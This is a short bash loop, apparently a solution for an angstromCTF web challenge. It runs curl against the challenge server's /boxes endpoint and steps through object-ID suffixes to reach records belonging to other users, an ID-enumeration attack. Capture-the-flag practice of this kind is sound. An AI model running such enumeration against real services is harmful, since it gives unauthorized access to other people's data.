for i in {73900..74000};
do 
curl "http://web.angstromctf.com:7667/boxes?ids=1,0,5aac9e698818c1001cc$i"; 
done
